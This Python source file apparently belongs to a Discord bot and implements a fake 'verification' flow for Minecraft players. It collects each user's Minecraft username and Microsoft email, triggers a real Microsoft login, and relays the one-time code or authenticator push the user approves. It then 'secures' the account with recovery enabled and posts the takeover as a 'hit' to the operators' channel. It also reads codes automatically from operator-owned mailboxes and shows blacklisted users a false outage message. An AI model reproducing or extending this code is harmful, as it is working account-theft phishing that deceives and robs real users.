"""Verification entry flow (Components V2).

Step order requested by the operator:

1. **Verify** button  ->  username-only modal.
2. Username submitted ->  "Username found" card (real skin) + *Enter email*.
3. *Enter email*      ->  "Email" modal (Microsoft email).
4. Email submitted    ->  confirmation code / authenticator push -> cards.
5. Code accepted      ->  "Being verified" card while the account is secured.
6. Result             ->  success card, or a red failure / timeout card with a
                          *Retry* button.

Every user-visible message uses :mod:`ui.theme` so the look stays identical
(green cards, red failures) with the button rendered *inside* the card.
"""

from __future__ import annotations

import asyncio
import logging
import re
from typing import Callable, Optional

import discord
from discord import ui

from database.database import DBConnection

from mail.settings import is_our_inbox, resolve_display_inbox

from shared.send_logs import send_logs, build_log_embed, censor_mail
from shared.post_hit import (
    publish_embed_secure_result,
    resolve_hits_channel,
    set_verify_ephemeral,
)
from shared import interactions

from securing.auth.check_auth import check_authenticator
from securing.auth.ngc_push import parse_ngc, start_authenticator_request
from securing.auth.initial_session import get_session
from securing.auth.send_auth import send_auth
from securing.secure import startSecuringAccount
from securing.utils.cookies.get_email_code import get_email_code

from minecraft.get_profile import username_exists

from ui import theme
from ui.buttons.embed_buttons import ButtonOptions

log = logging.getLogger("bot")

EMAIL_RE = re.compile(r"^[\w\.-]+@([\w-]+\.)+[\w-]{2,4}$")

_AUTH_TIMEOUT_SECONDS = 60
_OTP_WAIT_SECONDS = 120

ButtonCallback = Callable[[discord.Interaction], object]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _thumb(username: str) -> str:
    return theme.avatar_url(str(username or "").strip())


async def _log(
    interaction: discord.Interaction,
    description: str,
    colour: int,
    *,
    username: str = "",
    email: str = "",
    options_view: bool = True,
) -> None:
    """Best-effort log-channel post (never breaks the user flow)."""
    try:
        await send_logs(
            interaction.client,
            build_log_embed(
                description,
                colour,
                thumbnail=_thumb(username) if username else None,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=(
                ButtonOptions(interaction.user, interaction.user.id, username)
                if options_view
                else None
            ),
            email=email,
        )
    except Exception:
        log.warning("verification log post failed", exc_info=True)


async def _is_blacklisted(interaction: discord.Interaction) -> bool:
    try:
        with DBConnection() as database:
            return interaction.user.id in database.get_blacklisted_users()
    except Exception:
        log.warning("blacklist lookup failed", exc_info=True)
        return False


def _open_username_modal() -> ButtonCallback:
    async def _cb(interaction: discord.Interaction) -> None:
        await interactions.send_modal(interaction, MyModalOne())

    return _cb


def _open_email_modal(username: str) -> ButtonCallback:
    async def _cb(interaction: discord.Interaction) -> None:
        await interactions.send_modal(interaction, EmailModal(username))

    return _cb


def _open_code_modal(
    username: str, email: str, flowtoken, ppft=None
) -> ButtonCallback:
    async def _cb(interaction: discord.Interaction) -> None:
        from ui.modals.modal_two import MyModalTwo

        await interactions.send_modal(interaction,
            MyModalTwo(username, email, flowtoken, ppft)
        )

    return _cb


# ---------------------------------------------------------------------------
# Modals
# ---------------------------------------------------------------------------


class MyModalOne(ui.Modal):
    """Step 1 - Minecraft username only."""

    def __init__(self) -> None:
        super().__init__(title="Verification")
        self.add_item(
            ui.InputText(
                label="Minecraft Username",
                placeholder="e.g insomnia123",
                required=True,
                max_length=16,
            )
        )

    async def callback(self, interaction: discord.Interaction) -> None:
        username = str(self.children[0].value or "").strip()

        if await _is_blacklisted(interaction):
            await interactions.respond(interaction,
                view=theme.fail_card(
                    "Could not verify",
                    "Our systems seem to be down at the moment. Please try again in a few hours.",
                ),
                ephemeral=True,
            )
            await _log(
                interaction,
                "**Email | Status | Reason**\n``` | Refused to Verify | User has been blacklisted```",
                0xFA4343,
                username=username,
                email="",
                options_view=False,
            )
            return

        # Answer before the lookup so a slow Mojang API can never blow the
        # interaction window; the same card is then edited in place.
        await interactions.respond(interaction,
            view=theme.checking_card("Looking up that Minecraft profile..."),
            ephemeral=True,
        )

        exists = await username_exists(username)
        if exists is False:
            # Same red card language as every other failure: heading, reason,
            # boxed value and a Retry button inside the card.
            await set_verify_ephemeral(
                interaction,
                theme.fail_card(
                    "Username not found",
                    "No profile matched that name.",
                    field_label="Username",
                    field_value=username or "—",
                    on_retry=_open_username_modal(),
                ),
            )
            await _log(
                interaction,
                "**Username | Status | Reason**\n"
                f"```{username} | Refused to Verify | Username not found```",
                0xFA4343,
                options_view=False,
            )
            return

        await set_verify_ephemeral(
            interaction,
            theme.username_found_card(
                username,
                on_email=_open_email_modal(username),
            ),
        )


class EmailModal(ui.DesignerModal):
    """Step 3 - Microsoft email."""

    def __init__(self, username: str) -> None:
        self.username = username
        self.email_input = ui.TextInput(
            custom_id="mc_email",
            placeholder="you@outlook.com",
            max_length=254,
        )
        super().__init__(
            ui.Label("Microsoft email", self.email_input),
            title="Email",
        )

    async def callback(self, interaction: discord.Interaction) -> None:
        email = str(self.email_input.value or "").strip()
        await handle_email(interaction, self.username, email)


# ---------------------------------------------------------------------------
# Flow
# ---------------------------------------------------------------------------


async def handle_email(
    interaction: discord.Interaction, username: str, email: str
) -> None:
    if await _is_blacklisted(interaction):
        await set_verify_ephemeral(
            interaction,
            theme.fail_card(
                "Could not verify",
                "Our systems seem to be down at the moment. Please try again in a few hours.",
            ),
        )
        await _log(
            interaction,
            f"**Email | Status | Reason**\n```{email} | Refused to Verify | User has been blacklisted```",
            0xFA4343,
            username=username,
            email=email,
        )
        return

    if not EMAIL_RE.match(email):
        await set_verify_ephemeral(
            interaction,
            theme.fail_card(
                "Invalid Email Address",
                "Make sure you entered your email correctly!",
                on_retry=_open_email_modal(username),
            ),
        )
        await _log(
            interaction,
            f"**Email | Status | Reason**\n```{email} | Failed to Verify | Invalid email entered```",
            0xFA4343,
            username=username,
            email=email,
        )
        return

    await set_verify_ephemeral(
        interaction, theme.checking_card("Sending you a confirmation code...")
    )

    session = get_session()

    try:
        email_info = await send_auth(session, email)
    except Exception:
        log.exception("send_auth failed for %s", email)
        await set_verify_ephemeral(
            interaction,
            theme.fail_card(
                "Code not sent",
                "Something went wrong sending the confirmation. Try another method or wait a minute.",
                field_label="Destination",
                field_value=censor_mail(email),
                on_retry=_open_email_modal(username),
            ),
        )
        await _log(
            interaction,
            f"**Email | Status | Reason**\n```{email} | Failed to send code | send_auth error```",
            0xFA4343,
            username=username,
            email=email,
        )
        return

    if not isinstance(email_info, dict) or "type" not in email_info:
        await set_verify_ephemeral(
            interaction,
            theme.fail_card(
                "Failed to verify",
                "The email you entered does not exist, make sure you entered it correctly!",
                field_label="Destination",
                field_value=censor_mail(email),
                on_retry=_open_email_modal(username),
            ),
        )
        await _log(
            interaction,
            f"**Email | Status | Reason**\n```{email} | Failed to send code | Email does not exist```",
            0xFA4343,
            username=username,
            email=email,
        )
        return

    if email_info["type"] == "authenticator":
        await _authenticator_flow(interaction, session, username, email, email_info)
        return

    if email_info["type"] == "email":
        await _otp_flow(interaction, session, username, email, email_info)
        return

    # No usable OTP method at all.
    await set_verify_ephemeral(
        interaction,
        theme.fail_card(
            "Code not sent",
            "No recovery email could be found for this account. Add one and try again.",
            field_label="Destination",
            field_value=censor_mail(email),
            on_retry=_open_email_modal(username),
            extra_buttons=[_how_to_button()],
        ),
    )
    await _log(
        interaction,
        f"**Email | Status | Reason**\n```{email} | Failed to send code | No OTP methods found```",
        0xFA4343,
        username=username,
        email=email,
    )


def _how_to_button() -> discord.ui.Button:
    async def _cb(interaction: discord.Interaction) -> None:
        await interactions.respond(interaction,
            embed=discord.Embed(
                title="Add a Security Email",
                description=(
                    "Step-by-step:\n"
                    "1) Go to your Microsoft Account: "
                    "https://account.live.com/proofs/manage/additional\n"
                    "2) Open the \"Security\" section\n"
                    "3) Choose \"Advanced security options\"\n"
                    "4) Add a new verification method and select \"Email a code\"\n"
                    "5) Enter your email and wait 1-2 minutes before retrying verification."
                ),
                colour=0xFFFFFF,
            ),
            ephemeral=True,
        )

    return theme.button("How to?", discord.ButtonStyle.danger, _cb)


async def _authenticator_flow(
    interaction: discord.Interaction,
    session,
    username: str,
    email: str,
    email_info: dict,
) -> None:
    print("\n| Starting securing process |\n")
    print("[+] - Found Authenticator App")

    credentials = email_info["response"]["Credentials"]
    parsed = parse_ngc(credentials)
    if parsed is None:
        log.error("authenticator branch but RemoteNgcParams incomplete: %r", credentials)
        await set_verify_ephemeral(
            interaction,
            theme.fail_card(
                "Failed to verify",
                "Microsoft did not return an authenticator challenge for this account. Try again in a moment.",
                on_retry=_open_email_modal(username),
            ),
        )
        await _log(
            interaction,
            f"**Email | Status | Reason**\n```{email} | Failed to verify | No authenticator challenge```",
            0xFA4343,
            username=username,
            email=email,
        )
        return

    device, entropy = parsed

    if entropy is None:
        try:
            entropy = await start_authenticator_request(session, device)
        except Exception:
            log.exception("authenticator push failed for %s", email)
            entropy = None

    if entropy is None:
        await set_verify_ephemeral(
            interaction,
            theme.fail_card(
                "Authenticator request failed",
                "We could not ring your Microsoft Authenticator app. Open the app, check you "
                "are signed in there, then try again.",
                on_retry=_open_email_modal(username),
            ),
        )
        await _log(
            interaction,
            f"**Email | Status | Reason**\n```{email} | Failed to verify | Authenticator push not delivered```",
            0xFA4343,
            username=username,
            email=email,
        )
        return

    await set_verify_ephemeral(interaction, theme.authenticator_card(str(entropy)))
    await _log(
        interaction,
        f"**Username | Email | Status**\n```{username} | {email} | Waiting for Auth confirmation```",
        0x3B89FF,
        username=username,
        email=email,
    )

    for _ in range(_AUTH_TIMEOUT_SECONDS):
        data = await check_authenticator(device, session)

        if data["SessionState"] > 1 and data["AuthorizationState"] == 1:
            await set_verify_ephemeral(
                interaction,
                theme.fail_card(
                    "Failed to verify",
                    "You pressed the wrong number on your authenticator app. Try again!",
                    on_retry=_open_email_modal(username),
                ),
            )
            await _log(
                interaction,
                f"**Email | Status | Reason**\n```{email} | Failed to verify | Clicked on the wrong auth number```",
                0xFA4343,
                username=username,
                email=email,
            )
            return

        if data["SessionState"] > 1 and data["AuthorizationState"] > 1:
            await _log(
                interaction,
                f"**Username | Email | Status**\n```{username} | {email} | Auth code confirmed!```",
                0x79D990,
                username=username,
                email=email,
            )
            await set_verify_ephemeral(interaction, theme.being_verified_card(username))
            await _secure_and_publish(interaction, username, email, device=device)
            return

        await asyncio.sleep(1)

    await set_verify_ephemeral(
        interaction,
        theme.timeout_card(
            "No Authenticator response; retry to send a new prompt.",
            on_retry=_open_email_modal(username),
        ),
    )
    await _log(
        interaction,
        f"**Email | Status | Reason**\n```{email} | Failed to verify | Authenticator request timed out```",
        0xFA4343,
        username=username,
        email=email,
    )


async def _otp_flow(
    interaction: discord.Interaction,
    session,
    username: str,
    email: str,
    email_info: dict,
) -> None:
    proof = email_info["response"]["Credentials"]["OtcLoginEligibleProofs"][0]
    display = proof["display"]
    # Microsoft masks the proof name (jb*****@maxxspace.com). Polling that masked
    # string never finds the code even though the mail reached our real mailbox,
    # which showed up as "OTP did not arrive" while MS had in fact sent it.
    otc_inbox = email_info.get("otc_inbox")
    resolved = resolve_display_inbox(display) if otc_inbox is None else otc_inbox
    security_email = resolved or display
    flowtoken = proof["data"]
    ppft = email_info.get("ppft")

    print(f"[+] - Found security email: {security_email}")
    print(f"[+] - OTC display: {display}, otc_inbox: {otc_inbox}, resolved: {resolved}")

    if is_our_inbox(security_email) and "*" not in security_email:
        # Only auto-read when we have the REAL mailbox address, not the masked
        # display. A masked address like m6*****@maxxspace.com passes
        # is_our_inbox (domain matches) but doesn't exist as a real mailbox.
        if email_info.get("otc_sent") is False:
            # MS answered the request without mailing anything (State 206):
            # waiting on the inbox cannot succeed, so offer an immediate retry.
            await set_verify_ephemeral(
                interaction,
                theme.timeout_card(
                    "Microsoft did not send the code. Retry to send a new one.",
                    on_retry=_open_email_modal(username),
                ),
            )
            await _log(
                interaction,
                f"**Email | Status | Reason**\n```{email} | Failed to verify | "
                "Microsoft refused to send the code```",
                0xFA4343,
                username=username,
                email=email,
            )
            return
        # We own this mailbox (mail.tm) - read the code ourselves instead of
        # asking the user to open the inbox.
        await set_verify_ephemeral(
            interaction, theme.checking_card("Waiting for the code to arrive...")
        )
        await _log(
            interaction,
            f"**Username | Email | Status**\n```{username} | {email} | Waiting for OTP code (auto)```",
            0x3B89FF,
            username=username,
            email=email,
        )
        try:
            code = await get_email_code(security_email, timeout=_OTP_WAIT_SECONDS)
        except Exception:
            log.exception("auto OTP read failed for %s", security_email)
            code = None

        if not code:
            await set_verify_ephemeral(
                interaction,
                theme.timeout_card(
                    "We didn't receive the confirmation code in time. Retry to send a new one.",
                    on_retry=_open_email_modal(username),
                ),
            )
            await _log(
                interaction,
                f"**Email | Status | Reason**\n```{email} | Failed to verify | OTP did not arrive```",
                0xFA4343,
                username=username,
                email=email,
            )
            return

        await set_verify_ephemeral(interaction, theme.being_verified_card(username))
        await _secure_and_publish(
            interaction,
            username,
            email,
            device=flowtoken,
            code=code,
            ppft=ppft,
        )
        return

    # Mailbox we cannot read - ask the user for the code (button in the card).
    await set_verify_ephemeral(
        interaction,
        theme.otp_card(
            security_email,
            on_submit=_open_code_modal(username, email, flowtoken, ppft),
        ),
    )
    await _log(
        interaction,
        f"**Username | Email | Status**\n```{username} | {email} | Waiting for OTP code```",
        0x3B89FF,
        username=username,
        email=email,
    )


async def _secure_and_publish(
    interaction: discord.Interaction,
    username: str,
    email: str,
    *,
    device=None,
    code=None,
    ppft=None,
) -> None:
    # Unreachable hits channel costs the hit post, not the verification.
    hits_channel = await resolve_hits_channel(interaction.client)

    session = get_session()
    await send_logs(
        interaction.client, content="**This account is being automaticly secured**"
    )

    try:
        secured_account = await startSecuringAccount(
            session,
            email,
            device,
            code,
            recovery=True,
            ppft=ppft,
            embed_verify=True,
        )
    except Exception:
        log.exception("embed startSecuringAccount crashed")
        secured_account = {"failed": True, "reason": "Securing crashed"}

    await publish_embed_secure_result(
        interaction=interaction,
        hits_channel=hits_channel,
        secured_account=secured_account,
        email=email,
        username=username,
    )
